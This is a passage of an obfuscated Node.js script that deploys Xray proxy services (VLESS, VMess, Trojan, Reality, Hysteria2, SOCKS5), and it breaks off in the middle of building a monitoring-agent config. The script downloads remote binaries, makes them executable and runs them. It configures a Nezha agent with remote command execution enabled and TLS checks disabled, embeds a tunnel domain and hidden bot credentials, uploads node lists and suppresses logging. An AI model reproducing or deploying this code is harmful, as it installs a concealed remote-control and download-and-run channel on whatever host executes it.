#!/usr/bin/env node

const _0x475425 = _0x35ff
;(function (_0x315003, _0x103d7c) {
  const _0x13ba7f = { _0xf1774c: 0x1d9, _0x5e668e: 0x25c, _0x331416: 0x1f4, _0x4be381: 0x273 },
    _0x42944d = _0x35ff,
    _0x4f63a9 = _0x315003()
  while (!![]) {
    try {
      const _0x117934 =
        -parseInt(_0x42944d(0x294)) / 0x1 +
        (parseInt(_0x42944d(0x2da)) / 0x2) * (parseInt(_0x42944d(_0x13ba7f._0xf1774c)) / 0x3) +
        parseInt(_0x42944d(_0x13ba7f._0x5e668e)) / 0x4 +
        -parseInt(_0x42944d(0x242)) / 0x5 +
        (parseInt(_0x42944d(_0x13ba7f._0x331416)) / 0x6) * (-parseInt(_0x42944d(0x2a6)) / 0x7) +
        (parseInt(_0x42944d(0x2b6)) / 0x8) * (-parseInt(_0x42944d(_0x13ba7f._0x4be381)) / 0x9) +
        parseInt(_0x42944d(0x29d)) / 0xa
      if (_0x117934 === _0x103d7c) break
      else _0x4f63a9['push'](_0x4f63a9['shift']())
    } catch (_0x26eb11) {
      _0x4f63a9['push'](_0x4f63a9['shift']())
    }
  }
})(_0x1ccb, 0xd83f6)
const http = require('http'),
  axios = require(_0x475425(0x277)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x475425(0x244)),
  crypto = require(_0x475425(0x227)),
  { promisify } = require(_0x475425(0x28c)),
  { exec: execCommand, execSync } = require(_0x475425(0x20f)),
  exec = promisify(execCommand),
  PORT = process[_0x475425(0x1f5)][_0x475425(0x1ca)] || 0xbb8,
  SUB_PATH = process[_0x475425(0x1f5)]['SUB_PATH'] || _0x475425(0x1e2),
  NAME = process[_0x475425(0x1f5)][_0x475425(0x2d8)] || 'js-node',
  CFIP = process[_0x475425(0x1f5)][_0x475425(0x2b7)] || _0x475425(0x28d),
  CFPORT = process['env']['CFPORT'] || 0x1bb,
  UPLOAD_URL = process['env'][_0x475425(0x2ba)] || '',
  PROJECT_URL = process[_0x475425(0x1f5)][_0x475425(0x2ab)] || '',
  AUTO_ACCESS = process['env'][_0x475425(0x299)] || ![],
  FILE_PATH = process[_0x475425(0x1f5)][_0x475425(0x24b)] || '.npm',
  NEZHA_SERVER = process[_0x475425(0x1f5)]['NEZHA_SERVER'] || '',
  NEZHA_PORT = process[_0x475425(0x1f5)]['NEZHA_PORT'] || '',
  NEZHA_KEY = process[_0x475425(0x1f5)][_0x475425(0x234)] || '',
  UUID = process[_0x475425(0x1f5)][_0x475425(0x2e5)] || _0x475425(0x1e1),
  ARGO_AUTH = process['env'][_0x475425(0x2f1)] || _0x475425(0x257),
  ARGO_DOMAIN = process[_0x475425(0x1f5)][_0x475425(0x27a)] || 'deployzy.933993.xyz',
  ARGO_PORT = process[_0x475425(0x1f5)][_0x475425(0x2c6)] || 0xe2e1,
  S5_PORT = process['env'][_0x475425(0x27e)] || '',
  HY2_PORT = process['env'][_0x475425(0x253)] || '',
  REALITY_PORT = process[_0x475425(0x1f5)]['REALITY_PORT'] || '',
  CHAT_ID = process[_0x475425(0x1f5)][_0x475425(0x2af)] || _0x475425(0x290),
  BOT_TOKEN = process[_0x475425(0x1f5)][_0x475425(0x2b8)] || _0x475425(0x297),
  SHOW_LOG = !['false', _0x475425(0x252), 'no'][_0x475425(0x25f)]((process[_0x475425(0x1f5)][_0x475425(0x200)] || 'false')[_0x475425(0x249)]())
!SHOW_LOG && ((console[_0x475425(0x26b)] = () => {}), (console[_0x475425(0x1c7)] = () => {}))
function alwaysLog(_0x4402fa) {
  process['stdout']['write'](_0x4402fa + '\x0a')
}
if (!fs[_0x475425(0x2e3)](FILE_PATH)) fs[_0x475425(0x2ea)](FILE_PATH)
else {
}
function isValidPort(_0x598943) {
  const _0x2832ca = { _0x34bdb6: 0x21d },
    _0x2b6c00 = _0x475425
  try {
    if (_0x598943 === null || _0x598943 === undefined || _0x598943 === '') return ![]
    if (typeof _0x598943 === _0x2b6c00(_0x2832ca._0x34bdb6) && _0x598943['trim']() === '') return ![]
    const _0x284953 = parseInt(_0x598943)
    if (isNaN(_0x284953)) return ![]
    if (_0x284953 < 0x1 || _0x284953 > 0xffff) return ![]
    return !![]
  } catch (_0xc9a0cd) {
    return ![]
  }
}
function _0x35ff(_0x13d378, _0x435aa9) {
  const _0x1ccbb3 = _0x1ccb()
  return (
    (_0x35ff = function (_0x35ffaf, _0x2cb960) {
      _0x35ffaf = _0x35ffaf - 0x1c5
      let _0x46bd6f = _0x1ccbb3[_0x35ffaf]
      return _0x46bd6f
    }),
    _0x35ff(_0x13d378, _0x435aa9)
  )
}
function generateRandomName() {
  const _0x2cebe6 = { _0x574d35: 0x296, _0x28f9ca: 0x1dc, _0x58d13c: 0x2b0 },
    _0x37af5a = _0x475425,
    _0x241261 = 'abcdefghijklmnopqrstuvwxyz'
  let _0x10ab11 = ''
  for (let _0x136498 = 0x0; _0x136498 < 0x6; _0x136498++) {
    _0x10ab11 += _0x241261[_0x37af5a(_0x2cebe6._0x574d35)](
      Math[_0x37af5a(0x208)](Math[_0x37af5a(_0x2cebe6._0x28f9ca)]() * _0x241261[_0x37af5a(_0x2cebe6._0x58d13c)])
    )
  }
  return _0x10ab11
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x475425(0x2e1)](FILE_PATH, npmName),
  phpPath = path[_0x475425(0x2e1)](FILE_PATH, phpName),
  webPath = path[_0x475425(0x2e1)](FILE_PATH, webName),
  botPath = path[_0x475425(0x2e1)](FILE_PATH, botName),
  subPath = path['join'](FILE_PATH, _0x475425(0x1f0)),
  listPath = path[_0x475425(0x2e1)](FILE_PATH, 'list.txt'),
  bootLogPath = path['join'](FILE_PATH, _0x475425(0x2c7)),
  configPath = path[_0x475425(0x2e1)](FILE_PATH, _0x475425(0x231)),
  certPath = path['resolve'](FILE_PATH, _0x475425(0x21f)),
  keyPath = path[_0x475425(0x2ce)](FILE_PATH, _0x475425(0x210))
function deleteNodes() {
  const _0x3564f7 = {
      _0x4a7ae8: 0x2e3,
      _0x3b4b61: 0x1e3,
      _0x47901e: 0x2c9,
      _0x3332b0: 0x220,
      _0x31116d: 0x248,
      _0x11fbc3: 0x1f7,
      _0x1ac5bb: 0x258,
      _0x321735: 0x21c,
      _0x79b787: 0x260
    },
    _0x3900a6 = _0x475425
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x3900a6(_0x3564f7._0x4a7ae8)](subPath)) return
    let _0x5e03c9
    try {
      _0x5e03c9 = fs[_0x3900a6(_0x3564f7._0x3b4b61)](subPath, 'utf-8')
    } catch {
      return null
    }
    const _0x21cb13 = Buffer[_0x3900a6(_0x3564f7._0x47901e)](_0x5e03c9, _0x3900a6(_0x3564f7._0x3332b0))['toString'](_0x3900a6(_0x3564f7._0x31116d)),
      _0x29923f = _0x21cb13[_0x3900a6(_0x3564f7._0x11fbc3)]('\x0a')[_0x3900a6(_0x3564f7._0x1ac5bb)]((_0xa3b387) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0xa3b387)
      )
    if (_0x29923f['length'] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + _0x3900a6(_0x3564f7._0x321735), JSON[_0x3900a6(0x1ef)]({ nodes: _0x29923f }), {
        headers: { 'Content-Type': _0x3900a6(_0x3564f7._0x79b787) }
      })['catch']((_0x498e0e) => {
        return null
      }),
      null
    )
  } catch (_0x57cc06) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x38e1ab = { _0x1eee55: 0x2e8 },
    _0x2c09f3 = { _0x4ea2b5: 0x2c8, _0x54a80a: 0x2c1, _0x8dfc67: 0x206 },
    _0x47398e = _0x475425
  try {
    const _0x4927c9 = fs[_0x47398e(_0x38e1ab._0x1eee55)](FILE_PATH)
    _0x4927c9[_0x47398e(0x27b)]((_0x37c4ef) => {
      const _0x3cece6 = _0x47398e,
        _0x2cc938 = path['join'](FILE_PATH, _0x37c4ef)
      try {
        const _0x4b492b = fs[_0x3cece6(_0x2c09f3._0x4ea2b5)](_0x2cc938)
        _0x4b492b[_0x3cece6(_0x2c09f3._0x54a80a)]() && fs[_0x3cece6(_0x2c09f3._0x8dfc67)](_0x2cc938)
      } catch (_0xaef9b4) {}
    })
  } catch (_0x529a34) {}
}
function generateX25519Keypair() {
  const _0x3fbbba = { _0xcdde4b: 0x25d, _0x240bc8: 0x267, _0x4618d6: 0x2b1, _0x10bb39: 0x1e4 },
    _0x39636c = _0x475425,
    { publicKey: _0x36a7d1, privateKey: _0x26b69a } = crypto[_0x39636c(_0x3fbbba._0xcdde4b)](_0x39636c(0x21e)),
    _0x32b1c6 = _0x26b69a[_0x39636c(_0x3fbbba._0x240bc8)]({ type: _0x39636c(_0x3fbbba._0x4618d6), format: _0x39636c(0x217) })['subarray'](-0x20),
    _0x49b777 = _0x36a7d1['export']({ type: _0x39636c(_0x3fbbba._0x10bb39), format: _0x39636c(0x217) })[_0x39636c(0x21a)](-0x20)
  return { privateKey: _0x32b1c6[_0x39636c(0x243)]('base64url'), publicKey: _0x49b777[_0x39636c(0x243)](_0x39636c(0x1fa)) }
}
function generateOrLoadKeyPair() {
  const _0x589f9d = {
      _0x51b67d: 0x1c6,
      _0x2ce9c5: 0x2e3,
      _0x4d9367: 0x1e3,
      _0x5d0c9d: 0x2aa,
      _0x41bbb6: 0x238,
      _0x9d7da3: 0x1f8,
      _0x1fc65a: 0x1d3,
      _0xec2aa9: 0x29c,
      _0x37d553: 0x2bb,
      _0x342452: 0x20a,
      _0x364402: 0x2aa,
      _0x50175f: 0x26b
    },
    _0x11b953 = _0x475425,
    _0x3edc79 = path['join'](FILE_PATH, _0x11b953(_0x589f9d._0x51b67d))
  if (fs[_0x11b953(_0x589f9d._0x2ce9c5)](_0x3edc79)) {
    const _0x4aa4c9 = fs[_0x11b953(_0x589f9d._0x4d9367)](_0x3edc79, _0x11b953(_0x589f9d._0x5d0c9d)),
      _0xa6fd15 = _0x4aa4c9[_0x11b953(0x238)](/PrivateKey:\s*(.*)/),
      _0x515fe2 = _0x4aa4c9[_0x11b953(_0x589f9d._0x41bbb6)](/PublicKey:\s*(.*)/)
    if (_0xa6fd15 && _0x515fe2) {
      ;((privateKey = _0xa6fd15[0x1][_0x11b953(_0x589f9d._0x9d7da3)]()),
        (publicKey = _0x515fe2[0x1][_0x11b953(0x1f8)]()),
        console[_0x11b953(0x26b)]('Private\x20Key:', privateKey),
        console['log']('Public\x20Key:', publicKey))
      return
    }
  }
  const _0x3d4912 = generateX25519Keypair()
  ;((privateKey = _0x3d4912[_0x11b953(_0x589f9d._0x1fc65a)]),
    (publicKey = _0x3d4912[_0x11b953(_0x589f9d._0xec2aa9)]),
    fs[_0x11b953(_0x589f9d._0x37d553)](
      _0x3edc79,
      _0x11b953(0x1fd) + privateKey + _0x11b953(_0x589f9d._0x342452) + publicKey + '\x0a',
      _0x11b953(_0x589f9d._0x364402)
    ),
    console[_0x11b953(_0x589f9d._0x50175f)](_0x11b953(0x1e5), privateKey),
    console[_0x11b953(_0x589f9d._0x50175f)]('Public\x20Key:', publicKey))
}
const FALLBACK_EC_KEY =
    _0x475425(0x21b) +
    'BggqhkjOPQMBBw==\x0a' +
    '-----END\x20EC\x20PARAMETERS-----\x0a' +
    _0x475425(0x256) +
    _0x475425(0x2bf) +
    _0x475425(0x1fc) +
    _0x475425(0x28e) +
    _0x475425(0x26e),
  FALLBACK_CERT =
    _0x475425(0x202) +
    _0x475425(0x26a) +
    _0x475425(0x226) +
    _0x475425(0x282) +
    _0x475425(0x1cb) +
    _0x475425(0x1e9) +
    _0x475425(0x1cd) +
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a' +
    _0x475425(0x22c) +
    _0x475425(0x1f3)
function ensureTlsCertificates(_0xff6b85, _0x19c737) {
  const _0x6f68b0 = { _0x2eb9b5: 0x2e3, _0x3de80: 0x2ea, _0x32b53d: 0x280, _0x398ec6: 0x271, _0x30fc76: 0x230, _0x40c130: 0x209 },
    _0x32e62b = _0x475425
  if (fs[_0x32e62b(_0x6f68b0._0x2eb9b5)](_0xff6b85) && fs[_0x32e62b(0x2e3)](_0x19c737)) return
  fs[_0x32e62b(_0x6f68b0._0x3de80)](path[_0x32e62b(_0x6f68b0._0x32b53d)](_0xff6b85), { recursive: !![] })
  try {
    ;(execSync(_0x32e62b(_0x6f68b0._0x398ec6), { stdio: _0x32e62b(0x209) }),
      execSync(_0x32e62b(0x1e7) + _0x19c737 + '\x22', { stdio: _0x32e62b(0x209) }),
      execSync(_0x32e62b(_0x6f68b0._0x30fc76) + _0x19c737 + '\x22\x20-out\x20\x22' + _0xff6b85 + _0x32e62b(0x1c9), {
        stdio: _0x32e62b(_0x6f68b0._0x40c130)
      }))
    return
  } catch (_0x3ff043) {}
  ;(fs[_0x32e62b(0x2bb)](_0x19c737, FALLBACK_EC_KEY), fs['writeFileSync'](_0xff6b85, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x4d6476) {
  const _0x1088c0 = {
      _0x187209: 0x2aa,
      _0x4f3471: 0x1d2,
      _0x3f53e7: 0x2aa,
      _0x438ad7: 0x238,
      _0x5c1e0a: 0x1dd,
      _0x2d104b: 0x2c9,
      _0x175f0f: 0x1f2,
      _0x342276: 0x29f,
      _0x40c7e9: 0x268,
      _0x2017e0: 0x213,
      _0x3c998d: 0x2c5
    },
    _0x4f1cbe = _0x475425
  try {
    const _0x416ee8 = execSync(_0x4f1cbe(0x216) + _0x4d6476 + '\x22', { encoding: _0x4f1cbe(_0x1088c0._0x187209), timeout: 0xbb8 })['trim'](),
      _0x18d654 = _0x416ee8[_0x4f1cbe(0x238)](/=(.+)$/)
    if (_0x18d654 && _0x18d654[0x1]) return _0x18d654[0x1][_0x4f1cbe(_0x1088c0._0x4f3471)]()
  } catch (_0x4a3636) {}
  try {
    const _0x343a7f = fs['readFileSync'](_0x4d6476, _0x4f1cbe(_0x1088c0._0x3f53e7)),
      _0x386735 = _0x343a7f[_0x4f1cbe(_0x1088c0._0x438ad7)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x386735) return ''
    const _0x3fb7cd = _0x386735[0x1][_0x4f1cbe(_0x1088c0._0x5c1e0a)](/\s/g, ''),
      _0x1f5b71 = Buffer[_0x4f1cbe(_0x1088c0._0x2d104b)](_0x3fb7cd, 'base64'),
      _0x4caae9 = crypto[_0x4f1cbe(0x1ff)](_0x4f1cbe(_0x1088c0._0x175f0f))
        [_0x4f1cbe(_0x1088c0._0x342276)](_0x1f5b71)
        [_0x4f1cbe(_0x1088c0._0x40c7e9)](_0x4f1cbe(_0x1088c0._0x2017e0))
    return _0x4caae9['match'](/.{2}/g)[_0x4f1cbe(0x2e1)](':')[_0x4f1cbe(_0x1088c0._0x4f3471)]()
  } catch (_0x29c4c7) {
    return (console['error'](_0x4f1cbe(_0x1088c0._0x3c998d), _0x29c4c7), '')
  }
}
async function generateConfig() {
  const _0x165f5b = {
      _0x5be87: 0x279,
      _0x2ae977: 0x2a4,
      _0x4df8a0: 0x2a1,
      _0x107ac9: 0x2bc,
      _0x362518: 0x1d8,
      _0x15c984: 0x22f,
      _0x5c1be4: 0x1d6,
      _0x28a8ae: 0x23a,
      _0x5b599b: 0x239,
      _0xe15df0: 0x2e6,
      _0x3fa5bc: 0x23a,
      _0x23196d: 0x279,
      _0x329c61: 0x2c2,
      _0x32d01f: 0x20b,
      _0x2ad256: 0x23f,
      _0x4f4f73: 0x240,
      _0x47da69: 0x292,
      _0x4683c1: 0x219,
      _0x49ac68: 0x2b2,
      _0x3c56fe: 0x24d,
      _0x220580: 0x286,
      _0x37f679: 0x239,
      _0x19b9ba: 0x20b,
      _0x373d5f: 0x1da,
      _0x38e2a1: 0x269,
      _0x34afcd: 0x298,
      _0x2c6b8f: 0x2e1,
      _0x157e0e: 0x231
    },
    _0x4b0665 = _0x475425,
    _0x1ca0ac = {
      log: { access: _0x4b0665(0x2c4), error: '/dev/null', loglevel: _0x4b0665(_0x165f5b._0x5be87) },
      inbounds: [
        {
          tag: _0x4b0665(_0x165f5b._0x2ae977),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x4b0665(_0x165f5b._0x4df8a0),
          settings: {
            clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
            decryption: _0x4b0665(0x279),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x4b0665(_0x165f5b._0x107ac9), dest: 0xbba },
              { path: _0x4b0665(_0x165f5b._0x362518), dest: 0xbbb },
              { path: _0x4b0665(0x22d), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x4b0665(_0x165f5b._0x15c984) }
        },
        {
          tag: _0x4b0665(_0x165f5b._0x5c1be4),
          port: 0xbb9,
          listen: _0x4b0665(0x1f6),
          protocol: _0x4b0665(_0x165f5b._0x4df8a0),
          settings: { clients: [{ id: UUID }], decryption: _0x4b0665(0x279) },
          streamSettings: { network: _0x4b0665(_0x165f5b._0x15c984), security: 'none' }
        },
        {
          tag: _0x4b0665(0x2d9),
          port: 0xbba,
          listen: _0x4b0665(0x1f6),
          protocol: _0x4b0665(_0x165f5b._0x4df8a0),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x4b0665(_0x165f5b._0x5be87) },
          streamSettings: { network: 'ws', security: _0x4b0665(_0x165f5b._0x5be87), wsSettings: { path: _0x4b0665(0x2bc) } },
          sniffing: {
            enabled: !![],
            destOverride: [_0x4b0665(_0x165f5b._0x28a8ae), _0x4b0665(_0x165f5b._0x5b599b), _0x4b0665(0x2a3)],
            metadataOnly: ![]
          }
        },
        {
          tag: _0x4b0665(_0x165f5b._0xe15df0),
          port: 0xbbb,
          listen: '127.0.0.1',
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x4b0665(_0x165f5b._0x362518) } },
          sniffing: { enabled: !![], destOverride: [_0x4b0665(_0x165f5b._0x3fa5bc), _0x4b0665(0x239), _0x4b0665(0x2a3)], metadataOnly: ![] }
        },
        {
          tag: _0x4b0665(0x24f),
          port: 0xbbc,
          listen: '127.0.0.1',
          protocol: _0x4b0665(0x23b),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x4b0665(_0x165f5b._0x23196d), wsSettings: { path: '/trojan-argo' } },
          sniffing: { enabled: !![], destOverride: ['http', _0x4b0665(_0x165f5b._0x5b599b), 'quic'], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x4b0665(0x1f1)] },
      outbounds: [
        { protocol: _0x4b0665(_0x165f5b._0x329c61), tag: _0x4b0665(0x2d0) },
        { protocol: 'blackhole', tag: _0x4b0665(0x223) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x1ca0ac[_0x4b0665(_0x165f5b._0x32d01f)][_0x4b0665(0x219)]({
      tag: _0x4b0665(_0x165f5b._0x2ad256),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: 'vless',
      settings: { clients: [{ id: UUID, flow: _0x4b0665(_0x165f5b._0x4f4f73) }], decryption: _0x4b0665(_0x165f5b._0x5be87) },
      streamSettings: {
        network: _0x4b0665(0x281),
        security: _0x4b0665(_0x165f5b._0x47da69),
        realitySettings: { show: ![], dest: _0x4b0665(0x25b), xver: 0x0, serverNames: ['www.iij.ad.jp'], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x1ca0ac['inbounds'][_0x4b0665(_0x165f5b._0x4683c1)]({
        tag: 'hysteria-in',
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x4b0665(_0x165f5b._0x49ac68),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x4b0665(_0x165f5b._0x49ac68),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x4b0665(_0x165f5b._0x3c56fe), url: _0x4b0665(_0x165f5b._0x220580) } },
          security: _0x4b0665(_0x165f5b._0x37f679),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x1ca0ac[_0x4b0665(_0x165f5b._0x19b9ba)][_0x4b0665(0x219)]({
        tag: _0x4b0665(0x218),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x4b0665(_0x165f5b._0x373d5f),
        settings: {
          auth: _0x4b0665(_0x165f5b._0x38e2a1),
          accounts: [{ user: UUID[_0x4b0665(_0x165f5b._0x34afcd)](0x0, 0x8), pass: UUID[_0x4b0665(0x2b4)](-0xc) }],
          udp: !![]
        }
      }),
    fs['writeFileSync'](
      path[_0x4b0665(_0x165f5b._0x2c6b8f)](FILE_PATH, _0x4b0665(_0x165f5b._0x157e0e)),
      JSON[_0x4b0665(0x1ef)](_0x1ca0ac, null, 0x2)
    ))
}
function getSystemArchitecture() {
  const _0x5edcf5 = { _0x576359: 0x207, _0x12265e: 0x201 },
    _0x43c5e4 = _0x475425,
    _0xc1f378 = os[_0x43c5e4(_0x5edcf5._0x576359)]()
  return _0xc1f378 === _0x43c5e4(0x2be) || _0xc1f378 === _0x43c5e4(_0x5edcf5._0x12265e) || _0xc1f378 === 'aarch64' ? 'arm' : _0x43c5e4(0x24a)
}
function downloadFile(_0x34a346, _0x8b154c, _0x53f2cf) {
  const _0x51bfa1 = { _0x1dc250: 0x1ce },
    _0x5b9d7c = { _0x1dd8f7: 0x1d1 },
    _0x580e9f = { _0x5bb8b6: 0x241, _0x518e31: 0x1c7 },
    _0x15b61c = { _0x460f9e: 0x1d5, _0xa1d5c6: 0x264 },
    _0x2794d1 = _0x475425,
    _0x2a573a = _0x34a346,
    _0xaae486 = _0x2a573a + _0x2794d1(0x289)
  !fs['existsSync'](FILE_PATH) && fs[_0x2794d1(0x2ea)](FILE_PATH, { recursive: !![] })
  const _0x1825a9 = fs['createWriteStream'](_0xaae486)
  axios({ method: _0x2794d1(0x291), url: _0x8b154c, responseType: _0x2794d1(0x2df) })
    [_0x2794d1(_0x51bfa1._0x1dc250)]((_0x2afa81) => {
      const _0x2037be = _0x2794d1
      ;(_0x2afa81[_0x2037be(_0x580e9f._0x5bb8b6)][_0x2037be(0x229)](_0x1825a9),
        _0x1825a9['on'](_0x2037be(0x2ed), () => {
          const _0x5d4c63 = {
              _0x2b7dd7: 0x1d1,
              _0xd0df3f: 0x1c7,
              _0x2f3a73: 0x2d2,
              _0x4940f5: 0x264,
              _0x2e3907: 0x2d1,
              _0x193c24: 0x26b,
              _0x26ebf2: 0x1d1,
              _0x355ba2: 0x22a
            },
            _0x4ca666 = _0x2037be
          _0x1825a9[_0x4ca666(0x2a5)]((_0x2841b1) => {
            const _0x48f221 = _0x4ca666
            if (_0x2841b1) {
              const _0x59642a = 'Download\x20' + path[_0x48f221(_0x5d4c63._0x2b7dd7)](_0x2a573a) + _0x48f221(0x1d5) + _0x2841b1[_0x48f221(0x264)]
              ;(fs[_0x48f221(0x2d1)](_0xaae486, () => {}), console[_0x48f221(_0x5d4c63._0xd0df3f)](_0x59642a), _0x53f2cf(_0x59642a))
              return
            }
            try {
              fs[_0x48f221(_0x5d4c63._0x2f3a73)](_0xaae486, _0x2a573a)
            } catch (_0xaa2a57) {
              const _0x42578b =
                'Download\x20' + path[_0x48f221(_0x5d4c63._0x2b7dd7)](_0x2a573a) + '\x20failed:\x20' + _0xaa2a57[_0x48f221(_0x5d4c63._0x4940f5)]
              ;(fs[_0x48f221(_0x5d4c63._0x2e3907)](_0xaae486, () => {}), console['error'](_0x42578b), _0x53f2cf(_0x42578b))
              return
            }
            ;(console[_0x48f221(_0x5d4c63._0x193c24)](
              _0x48f221(0x1e0) + path[_0x48f221(_0x5d4c63._0x26ebf2)](_0x2a573a) + _0x48f221(_0x5d4c63._0x355ba2)
            ),
              _0x53f2cf(null, _0x2a573a))
          })
        }),
        _0x1825a9['on'](_0x2037be(_0x580e9f._0x518e31), (_0x46f023) => {
          const _0x2074e6 = _0x2037be
          fs[_0x2074e6(0x2d1)](_0xaae486, () => {})
          const _0x432c2f =
            _0x2074e6(0x1e0) + path[_0x2074e6(0x1d1)](_0x2a573a) + _0x2074e6(_0x15b61c._0x460f9e) + _0x46f023[_0x2074e6(_0x15b61c._0xa1d5c6)]
          ;(console[_0x2074e6(0x1c7)](_0x432c2f), _0x53f2cf(_0x432c2f))
        }))
    })
    ['catch']((_0xb1cdae) => {
      const _0x19dcd8 = _0x2794d1
      fs['unlink'](_0xaae486, () => {})
      const _0x5df7db = _0x19dcd8(0x1e0) + path[_0x19dcd8(_0x5b9d7c._0x1dd8f7)](_0x2a573a) + '\x20failed:\x20' + _0xb1cdae[_0x19dcd8(0x264)]
      ;(console[_0x19dcd8(0x1c7)](_0x5df7db), _0x53f2cf(_0x5df7db))
    })
}
async function downloadFilesAndRun() {
  const _0x408168 = {
      _0x4781fe: 0x2b5,
      _0x26344d: 0x2a9,
      _0x440943: 0x1c7,
      _0xcccc9f: 0x2a0,
      _0x25e6a4: 0x2e4,
      _0x132ef8: 0x228,
      _0x19dc9f: 0x1d7,
      _0xac7789: 0x2db,
      _0x4a3ca1: 0x295,
      _0x6ceeb6: 0x2e1,
      _0x108c7d: 0x23d,
      _0x17f06f: 0x262,
      _0x60356c: 0x26b,
      _0x41ae41: 0x2dd,
      _0x2322ed: 0x24c,
      _0x4c3f15: 0x247,
      _0x766d11: 0x228,
      _0x42880c: 0x25f,
      _0x5bba13: 0x221,
      _0x5f09d2: 0x224,
      _0x2cdc4e: 0x2de,
      _0x55e50e: 0x1c8,
      _0x193889: 0x2a8,
      _0x271c79: 0x238,
      _0x290d2b: 0x22b,
      _0x507847: 0x238,
      _0x205832: 0x26c,
      _0x2421a2: 0x2ae,
      _0x49c947: 0x2c0,
      _0x2460c4: 0x2ce
    },
    _0x59b6cf = { _0x4afd44: 0x26b, _0x1aa111: 0x1e8 },
    _0x38ec3f = _0x475425,
    _0x246bd3 = getSystemArchitecture(),
    _0x3d04c2 = getFilesForArchitecture(_0x246bd3)
  if (_0x3d04c2[_0x38ec3f(0x2b0)] === 0x0) {
    console['log'](_0x38ec3f(_0x408168._0x4781fe))
    return
  }
  const _0x136e76 = _0x3d04c2[_0x38ec3f(_0x408168._0x26344d)]((_0x13e473) => {
    return new Promise((_0x4c983a, _0x22df89) => {
      const _0x473b68 = { _0x2ff527: 0x2a7, _0x36d6ba: 0x1d1, _0x2dbe24: 0x20d },
        _0x5ec3df = (_0x15627a) => {
          const _0x21b843 = _0x35ff
          downloadFile(_0x13e473[_0x21b843(0x2eb)], _0x13e473[_0x21b843(0x2a7)][_0x15627a], (_0xa8ec18, _0x23cfa5) => {
            const _0x5d7d97 = _0x21b843
            if (!_0xa8ec18) {
              _0x4c983a(_0x23cfa5)
              return
            }
            if (_0x15627a + 0x1 < _0x13e473[_0x5d7d97(_0x473b68._0x2ff527)]['length']) {
              ;(console['log']('Retrying\x20' + path[_0x5d7d97(_0x473b68._0x36d6ba)](_0x13e473[_0x5d7d97(0x2eb)]) + _0x5d7d97(_0x473b68._0x2dbe24)),
                _0x5ec3df(_0x15627a + 0x1))
              return
            }
            _0x22df89(_0xa8ec18)
          })
        }
      _0x5ec3df(0x0)
    })
  })
  try {
    await Promise['all'](_0x136e76)
  } catch (_0x2017ca) {
    console[_0x38ec3f(_0x408168._0x440943)](_0x38ec3f(0x2d6), _0x2017ca)
    return
  }
  function _0x231f3f(_0xdfeb2d) {
    const _0x17edf2 = 0x1fd
    _0xdfeb2d['forEach']((_0x563e18) => {
      const _0x4f2445 = _0x35ff
      if (fs[_0x4f2445(0x2e3)](_0x563e18))
        try {
          ;(fs['chmodSync'](_0x563e18, _0x17edf2),
            console[_0x4f2445(_0x59b6cf._0x4afd44)]('Empowerment\x20success\x20for\x20' + _0x563e18 + ':\x20' + _0x17edf2[_0x4f2445(0x243)](0x8)))
        } catch (_0x24c70c) {
          console['error'](_0x4f2445(_0x59b6cf._0x1aa111) + _0x563e18 + ':\x20' + _0x24c70c)
        }
    })
  }
  const _0x4add2e = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x231f3f(_0x4add2e)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x3834f4 = NEZHA_SERVER[_0x38ec3f(0x25f)](':') ? NEZHA_SERVER[_0x38ec3f(0x1f7)](':')['pop']() : '',
        _0x3f536b = new Set([
          _0x38ec3f(_0x408168._0xcccc9f),
          _0x38ec3f(_0x408168._0x25e6a4),
          _0x38ec3f(0x247),
          _0x38ec3f(_0x408168._0x132ef8),
          _0x38ec3f(_0x408168._0x19dc9f),
          _0x38ec3f(0x2cd)
        ]),
        _0x537dc8 = _0x3f536b[_0x38ec3f(0x2f0)](_0x3834f4) ? _0x38ec3f(0x2bd) : _0x38ec3f(_0x408168._0xac7789),
        _0x283598 =
          '\x0aclient_secret:\x20' +
          NEZHA_KEY +
          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
          NEZHA_SERVER +
          _0x38ec3f(0x255) +
          _0x537dc8 +
          _0x38ec3f(_0x408168._0x4a3ca1) +
          UUID
